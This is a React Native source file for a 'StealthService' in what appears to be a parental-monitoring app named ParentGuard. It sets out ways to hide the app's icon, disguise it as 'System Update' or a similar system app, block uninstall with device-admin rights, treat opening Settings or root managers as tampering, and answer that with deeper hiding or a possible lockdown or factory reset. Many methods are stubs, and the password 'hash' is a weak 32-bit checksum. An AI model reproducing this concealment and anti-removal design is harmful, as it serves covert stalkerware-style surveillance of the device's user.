/**
 * StealthService - Security and stealth features
 * Handles app concealment, tamper protection, and security
 */

import { Platform, Alert, Linking, NativeModules } from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import DeviceInfo from 'react-native-device-info';
import ApiService from './ApiService';

class StealthService {
  constructor() {
    this.isStealthMode = false;
    this.isProtected = false;
    this.adminPasswordHash = null;
    this.tamperDetectionActive = false;
    this.securityCheckInterval = null;
    
    // Security settings
    this.securityConfig = {
      hideAppIcon: false,
      preventUninstall: false,
      requirePasswordForChanges: false,
      detectTamperAttempts: false,
      disguiseAppName: false,
      runAsSystemService: false
    };
  }

  async initialize() {
    console.log('Initializing stealth service...');
    
    try {
      // Load stealth configuration
      await this.loadStealthConfig();
      
      // Setup security measures
      await this.setupSecurity();
      
      // Start tamper detection
      if (this.securityConfig.detectTamperAttempts) {
        await this.startTamperDetection();
      }
      
      console.log('Stealth service initialized successfully');
      return true;
    } catch (error) {
      console.error('Stealth service initialization error:', error);
      return false;
    }
  }

  async loadStealthConfig() {
    try {
      const configData = await AsyncStorage.getItem('stealth_config');
      if (configData) {
        this.securityConfig = { ...this.securityConfig, ...JSON.parse(configData) };
      }
      
      const stealthMode = await AsyncStorage.getItem('stealth_mode');
      this.isStealthMode = stealthMode === 'true';
      
      const passwordHash = await AsyncStorage.getItem('admin_password_hash');
      this.adminPasswordHash = passwordHash;
      
      console.log('Loaded stealth configuration:', this.securityConfig);
    } catch (error) {
      console.error('Load stealth config error:', error);
    }
  }

  async setupSecurity() {
    try {
      console.log('Setting up security measures...');
      
      // Hide app icon if configured
      if (this.securityConfig.hideAppIcon) {
        await this.hideAppIcon();
      }
      
      // Prevent uninstall if configured
      if (this.securityConfig.preventUninstall) {
        await this.enableUninstallProtection();
      }
      
      // Disguise app if configured
      if (this.securityConfig.disguiseAppName) {
        await this.disguiseApp();
      }
      
      // Run as system service if configured
      if (this.securityConfig.runAsSystemService) {
        await this.runAsSystemService();
      }
      
      this.isProtected = true;
      console.log('Security measures activated');
    } catch (error) {
      console.error('Security setup error:', error);
    }
  }

  async hideAppIcon() {
    try {
      console.log('Attempting to hide app icon...');
      
      if (Platform.OS === 'android') {
        // This requires native Android implementation
        // The app icon can be hidden by disabling the launcher activity
        
        // Alternative approach: Change app icon to transparent or system-like icon
        await this.setTransparentIcon();
      } else {
        console.log('App icon hiding not available on iOS');
      }
      
      // Log the stealth activation
      await ApiService.sendAlert('stealth_activated', {
        action: 'hide_icon',
        timestamp: new Date().toISOString()
      });
      
    } catch (error) {
      console.error('Hide app icon error:', error);
    }
  }

  async setTransparentIcon() {
    try {
      // This would require native implementation to change the app icon
      // at runtime to a transparent or system-looking icon
      console.log('Setting transparent/disguised icon');
      
      // Store the stealth state
      await AsyncStorage.setItem('icon_hidden', 'true');
      
    } catch (error) {
      console.error('Set transparent icon error:', error);
    }
  }

  async enableUninstallProtection() {
    try {
      console.log('Enabling uninstall protection...');
      
      if (Platform.OS === 'android') {
        // This requires Device Administrator privileges
        // The app needs to be registered as a device admin to prevent uninstallation
        
        await this.requestDeviceAdminPrivileges();
        await this.enableDeviceAdminProtection();
      } else {
        console.log('Uninstall protection requires MDM on iOS');
      }
      
    } catch (error) {
      console.error('Uninstall protection error:', error);
    }
  }

  async requestDeviceAdminPrivileges() {
    try {
      console.log('Requesting device administrator privileges...');
      
      // This would require native Android implementation
      // to request device administrator privileges
      
      Alert.alert(
        'Device Security',
        'ParentGuard needs device administrator privileges to prevent unauthorized changes.',
        [
          {
            text: 'Cancel',
            style: 'cancel'
          },
          {
            text: 'Enable Protection',
            onPress: async () => {
              // This would open Android device admin settings
              // Linking.openURL('android.settings.DEVICE_ADMIN_SETTINGS');
              
              // For demo, assume it's enabled
              await AsyncStorage.setItem('device_admin_enabled', 'true');
              console.log('Device admin protection enabled');
            }
          }
        ]
      );
      
    } catch (error) {
      console.error('Device admin request error:', error);
    }
  }

  async enableDeviceAdminProtection() {
    try {
      // Once device admin is enabled, the app becomes harder to uninstall
      // and can receive device admin events
      
      await AsyncStorage.setItem('uninstall_protected', 'true');
      
      // Send confirmation to parents
      await ApiService.sendAlert('protection_enabled', {
        type: 'uninstall_protection',
        timestamp: new Date().toISOString()
      });
      
    } catch (error) {
      console.error('Device admin protection error:', error);
    }
  }

  async disguiseApp() {
    try {
      console.log('Disguising app appearance...');
      
      // Change app name and icon to look like a system app
      const disguises = [
        { name: 'System Update', icon: 'system_update' },
        { name: 'Security Service', icon: 'security' },
        { name: 'Network Monitor', icon: 'wifi' },
        { name: 'Device Manager', icon: 'settings' },
        { name: 'Battery Optimizer', icon: 'battery' }
      ];
      
      const selectedDisguise = disguises[Math.floor(Math.random() * disguises.length)];
      
      // This would require native implementation to change app metadata
      await this.setAppDisguise(selectedDisguise);
      
      await AsyncStorage.setItem('app_disguised', 'true');
      await AsyncStorage.setItem('disguise_name', selectedDisguise.name);
      
    } catch (error) {
      console.error('App disguise error:', error);
    }
  }

  async setAppDisguise(disguise) {
    try {
      // Native implementation would change:
      // - App name in launcher
      // - App icon
      // - Package metadata (if possible)
      
      console.log(`Disguising app as: ${disguise.name}`);
      
    } catch (error) {
      console.error('Set app disguise error:', error);
    }
  }

  async runAsSystemService() {
    try {
      console.log('Attempting to run as system service...');
      
      if (Platform.OS === 'android') {
        // This would require root access or system-level privileges
        // The app would need to be installed as a system app
        
        // Alternative: Run background service that looks system-like
        await this.startSystemLikeService();
      }
      
    } catch (error) {
      console.error('System service error:', error);
    }
  }

  async startSystemLikeService() {
    try {
      // Start a background service with system-like characteristics
      // This would require native Android service implementation
      
      console.log('Starting system-like background service');
      await AsyncStorage.setItem('system_service_active', 'true');
      
    } catch (error) {
      console.error('System service start error:', error);
    }
  }

  async startTamperDetection() {
    try {
      console.log('Starting tamper detection...');
      
      this.tamperDetectionActive = true;
      
      // Monitor for various tamper attempts
      this.securityCheckInterval = setInterval(() => {
        this.performSecurityChecks();
      }, 30 * 1000); // Every 30 seconds
      
      // Monitor app usage patterns for suspicious activity
      await this.monitorUsagePatterns();
      
      // Check for root/jailbreak attempts
      await this.monitorRootDetection();
      
      console.log('Tamper detection activated');
    } catch (error) {
      console.error('Tamper detection setup error:', error);
    }
  }

  async performSecurityChecks() {
    try {
      if (!this.tamperDetectionActive) return;
      
      // Check if app is still installed properly
      await this.checkAppIntegrity();
      
      // Check for debugging attempts
      await this.checkDebuggingAttempts();
      
      // Check for uninstallation attempts
      await this.checkUninstallAttempts();
      
      // Monitor for suspicious apps
      await this.monitorSuspiciousApps();
      
    } catch (error) {
      console.error('Security checks error:', error);
    }
  }

  async checkAppIntegrity() {
    try {
      // Verify app files and configuration haven't been tampered with
      const expectedChecksum = await AsyncStorage.getItem('app_checksum');
      const currentChecksum = await this.calculateAppChecksum();
      
      if (expectedChecksum && currentChecksum !== expectedChecksum) {
        await this.handleTamperAttempt('app_modified', {
          expected: expectedChecksum,
          current: currentChecksum
        });
      }
      
    } catch (error) {
      console.error('App integrity check error:', error);
    }
  }

  async calculateAppChecksum() {
    try {
      // This would calculate a checksum of critical app files
      // For demo, return a mock checksum
      return 'mock_checksum_' + Date.now();
    } catch (error) {
      console.error('Checksum calculation error:', error);
      return null;
    }
  }

  async checkDebuggingAttempts() {
    try {
      // Check if debugger is attached
      const isDebugging = await DeviceInfo.isEmulator();
      
      if (isDebugging) {
        await this.handleTamperAttempt('debugging_detected', {
          type: 'emulator_or_debug'
        });
      }
      
    } catch (error) {
      console.error('Debug detection error:', error);
    }
  }

  async checkUninstallAttempts() {
    try {
      // Monitor for settings app being opened (potential uninstall attempt)
      // This would require native implementation to monitor app launches
      
      const settingsAccessed = await this.detectSettingsAccess();
      if (settingsAccessed) {
        await this.handleTamperAttempt('uninstall_attempt', {
          action: 'settings_accessed'
        });
      }
      
    } catch (error) {
      console.error('Uninstall attempt check error:', error);
    }
  }

  async detectSettingsAccess() {
    try {
      // This would require native implementation to detect
      // when Android Settings app is opened
      return false; // Placeholder
    } catch (error) {
      return false;
    }
  }

  async monitorSuspiciousApps() {
    try {
      // Monitor for installation of apps that could interfere
      const suspiciousApps = [
        'com.android.packageinstaller', // Package installer
        'com.android.settings', // Settings (if accessed frequently)
        'com.topjohnwu.magisk', // Magisk (root manager)
        'eu.chainfire.supersu', // SuperSU (root manager)
        'com.noshufou.android.su', // Superuser
        'com.koushikdutta.superuser',
        'com.thirdparty.superuser',
        'com.yellowes.su'
      ];
      
      // This would require native implementation to check installed apps
      // and detect when suspicious apps are installed/launched
      
    } catch (error) {
      console.error('Suspicious app monitoring error:', error);
    }
  }

  async monitorRootDetection() {
    try {
      // Check for root access periodically
      const isRooted = await this.detectRoot();
      
      if (isRooted) {
        await this.handleTamperAttempt('root_detected', {
          type: 'device_rooted'
        });
      }
      
    } catch (error) {
      console.error('Root detection error:', error);
    }
  }

  async detectRoot() {
    try {
      // Various methods to detect root access
      // This would require native implementation for accurate detection
      
      // Check for common root apps
      const rootApps = [
        'com.noshufou.android.su',
        'com.thirdparty.superuser',
        'eu.chainfire.supersu',
        'com.koushikdutta.superuser',
        'com.topjohnwu.magisk'
      ];
      
      // Check for root binaries (would require native implementation)
      const rootBinaries = [
        '/system/app/Superuser.apk',
        '/system/xbin/daemonsu',
        '/system/etc/init.d/99SuperSUDaemon',
        '/system/bin/su',
        '/system/xbin/su'
      ];
      
      return false; // Placeholder - would need native implementation
    } catch (error) {
      console.error('Root detection error:', error);
      return false;
    }
  }

  async monitorUsagePatterns() {
    try {
      // Monitor for unusual usage patterns that might indicate tampering
      const patterns = await AsyncStorage.getItem('usage_patterns');
      const currentPattern = await this.getCurrentUsagePattern();
      
      if (patterns && this.isAnomalousPattern(JSON.parse(patterns), currentPattern)) {
        await this.handleTamperAttempt('anomalous_usage', {
          pattern: currentPattern
        });
      }
      
    } catch (error) {
      console.error('Usage pattern monitoring error:', error);
    }
  }

  async getCurrentUsagePattern() {
    try {
      return {
        timestamp: new Date().toISOString(),
        appOpened: true,
        frequency: 'normal' // Would be calculated based on actual usage
      };
    } catch (error) {
      return null;
    }
  }

  isAnomalousPattern(historicalPatterns, currentPattern) {
    try {
      // Analyze patterns to detect anomalies
      // This would implement machine learning or statistical analysis
      return false; // Placeholder
    } catch (error) {
      return false;
    }
  }

  async handleTamperAttempt(type, details) {
    try {
      console.log(`Tamper attempt detected: ${type}`, details);
      
      // Log the attempt
      const tamperEvent = {
        type: type,
        details: details,
        timestamp: new Date().toISOString(),
        severity: this.getTamperSeverity(type),
        deviceInfo: await DeviceInfo.getUniqueId()
      };
      
      await this.logTamperEvent(tamperEvent);
      
      // Send immediate alert to parents
      await ApiService.sendAlert('tamper_attempt', tamperEvent);
      
      // Take defensive action based on severity
      await this.takeDefensiveAction(type, tamperEvent.severity);
      
    } catch (error) {
      console.error('Handle tamper attempt error:', error);
    }
  }

  getTamperSeverity(type) {
    const severityMap = {
      'app_modified': 'high',
      'debugging_detected': 'medium',
      'uninstall_attempt': 'high',
      'root_detected': 'critical',
      'anomalous_usage': 'low'
    };
    
    return severityMap[type] || 'medium';
  }

  async takeDefensiveAction(type, severity) {
    try {
      console.log(`Taking defensive action for ${type} (severity: ${severity})`);
      
      switch (severity) {
        case 'critical':
          // Lock device or wipe data (requires device admin)
          await this.emergencyLockdown();
          break;
          
        case 'high':
          // Increase monitoring, hide deeper
          await this.enhanceStealth();
          await this.increaseMonitoring();
          break;
          
        case 'medium':
          // Alert parents, log detailed info
          await this.increaseLogging();
          break;
          
        case 'low':
          // Just log for analysis
          await this.logForAnalysis(type);
          break;
      }
      
    } catch (error) {
      console.error('Defensive action error:', error);
    }
  }

  async emergencyLockdown() {
    try {
      console.log('Initiating emergency lockdown...');
      
      // This would require device admin privileges
      // Could lock screen, disable apps, or in extreme cases, factory reset
      
      await ApiService.sendAlert('emergency_lockdown', {
        timestamp: new Date().toISOString(),
        reason: 'Critical tamper attempt detected'
      });
      
    } catch (error) {
      console.error('Emergency lockdown error:', error);
    }
  }

  async enhanceStealth() {
    try {
      console.log('Enhancing stealth measures...');
      
      // Go deeper into stealth mode
      await this.hideAppIcon();
      await this.setTransparentIcon();
      await AsyncStorage.setItem('enhanced_stealth', 'true');
      
    } catch (error) {
      console.error('Enhanced stealth error:', error);
    }
  }

  async increaseMonitoring() {
    try {
      console.log('Increasing monitoring frequency...');
      
      // Reduce security check intervals
      if (this.securityCheckInterval) {
        clearInterval(this.securityCheckInterval);
        this.securityCheckInterval = setInterval(() => {
          this.performSecurityChecks();
        }, 10 * 1000); // Every 10 seconds instead of 30
      }
      
    } catch (error) {
      console.error('Increase monitoring error:', error);
    }
  }

  async increaseLogging() {
    try {
      console.log('Increasing logging detail...');
      await AsyncStorage.setItem('detailed_logging', 'true');
    } catch (error) {
      console.error('Increase logging error:', error);
    }
  }

  async logForAnalysis(type) {
    try {
      const analysisLog = {
        type: type,
        timestamp: new Date().toISOString(),
        context: await this.getSecurityContext()
      };
      
      await AsyncStorage.setItem(`analysis_${Date.now()}`, JSON.stringify(analysisLog));
    } catch (error) {
      console.error('Log for analysis error:', error);
    }
  }

  async logTamperEvent(event) {
    try {
      const key = `tamper_event_${Date.now()}`;
      await AsyncStorage.setItem(key, JSON.stringify(event));
      
      // Try to sync immediately if connected
      const connected = await ApiService.checkConnection();
      if (connected) {
        await this.syncTamperEvents();
      }
      
    } catch (error) {
      console.error('Log tamper event error:', error);
    }
  }

  async syncTamperEvents() {
    try {
      const keys = await AsyncStorage.getAllKeys();
      const tamperKeys = keys.filter(key => key.startsWith('tamper_event_'));
      
      if (tamperKeys.length === 0) return;
      
      const events = [];
      for (const key of tamperKeys) {
        const data = await AsyncStorage.getItem(key);
        if (data) {
          events.push(JSON.parse(data));
        }
      }
      
      if (events.length > 0) {
        const childId = await AsyncStorage.getItem('child_id');
        if (childId) {
          await ApiService.makeRequest('POST', `/monitoring/${childId}/security-events/batch`, {
            events: events,
            sync_timestamp: new Date().toISOString()
          });
          
          // Remove synced events
          for (const key of tamperKeys) {
            await AsyncStorage.removeItem(key);
          }
          
          console.log(`Synced ${events.length} tamper events`);
        }
      }
      
    } catch (error) {
      console.error('Sync tamper events error:', error);
    }
  }

  async getSecurityContext() {
    try {
      return {
        timestamp: new Date().toISOString(),
        deviceId: await DeviceInfo.getUniqueId(),
        isEmulator: await DeviceInfo.isEmulator(),
        batteryLevel: await DeviceInfo.getBatteryLevel(),
        totalMemory: await DeviceInfo.getTotalMemory(),
        usedMemory: await DeviceInfo.getUsedMemory()
      };
    } catch (error) {
      console.error('Get security context error:', error);
      return {};
    }
  }

  // Password protection methods
  async setAdminPassword(password) {
    try {
      // Hash the password before storing
      const hash = await this.hashPassword(password);
      this.adminPasswordHash = hash;
      await AsyncStorage.setItem('admin_password_hash', hash);
      
      console.log('Admin password set');
      return true;
    } catch (error) {
      console.error('Set admin password error:', error);
      return false;
    }
  }

  async verifyAdminPassword(password) {
    try {
      if (!this.adminPasswordHash) {
        return false;
      }
      
      const hash = await this.hashPassword(password);
      return hash === this.adminPasswordHash;
    } catch (error) {
      console.error('Verify admin password error:', error);
      return false;
    }
  }

  async hashPassword(password) {
    try {
      // Simple hash function - in production, use a proper crypto library
      let hash = 0;
      for (let i = 0; i < password.length; i++) {
        const char = password.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash; // Convert to 32-bit integer
      }
      return hash.toString();
    } catch (error) {
      console.error('Hash password error:', error);
      return null;
    }
  }

  async promptAdminPassword() {
    return new Promise((resolve) => {
      Alert.prompt(
        'Administrator Access',
        'Enter administrator password to make changes:',
        [
          {
            text: 'Cancel',
            style: 'cancel',
            onPress: () => resolve(false)
          },
          {
            text: 'OK',
            onPress: async (password) => {
              const valid = await this.verifyAdminPassword(password);
              resolve(valid);
            }
          }
        ],
        'secure-text'
      );
    });
  }

  // Public configuration methods
  async enableStealthMode() {
    try {
      this.isStealthMode = true;
      await AsyncStorage.setItem('stealth_mode', 'true');
      
      // Apply stealth measures
      await this.setupSecurity();
      
      console.log('Stealth mode enabled');
      return true;
    } catch (error) {
      console.error('Enable stealth mode error:', error);
      return false;
    }
  }

  async disableStealthMode() {
    try {
      if (this.securityConfig.requirePasswordForChanges) {
        const authorized = await this.promptAdminPassword();
        if (!authorized) {
          console.log('Admin password required to disable stealth mode');
          return false;
        }
      }
      
      this.isStealthMode = false;
      await AsyncStorage.setItem('stealth_mode', 'false');
      
      console.log('Stealth mode disabled');
      return true;
    } catch (error) {
      console.error('Disable stealth mode error:', error);
      return false;
    }
  }

  async updateSecurityConfig(config) {
    try {
      if (this.securityConfig.requirePasswordForChanges) {
        const authorized = await this.promptAdminPassword();
        if (!authorized) {
          return false;
        }
      }
      
      this.securityConfig = { ...this.securityConfig, ...config };
      await AsyncStorage.setItem('stealth_config', JSON.stringify(this.securityConfig));
      
      // Reapply security measures with new config
      await this.setupSecurity();
      
      console.log('Security configuration updated');
      return true;
    } catch (error) {
      console.error('Update security config error:', error);
      return false;
    }
  }

  getStatus() {
    return {
      isStealthMode: this.isStealthMode,
      isProtected: this.isProtected,
      tamperDetectionActive: this.tamperDetectionActive,
      hasAdminPassword: this.adminPasswordHash !== null,
      securityConfig: this.securityConfig
    };
  }

  async cleanup() {
    try {
      console.log('Cleaning up stealth service...');
      
      this.tamperDetectionActive = false;
      
      if (this.securityCheckInterval) {
        clearInterval(this.securityCheckInterval);
        this.securityCheckInterval = null;
      }
      
      console.log('Stealth service cleanup completed');
    } catch (error) {
      console.error('Stealth service cleanup error:', error);
    }
  }
}

export { StealthService };
export default new StealthService();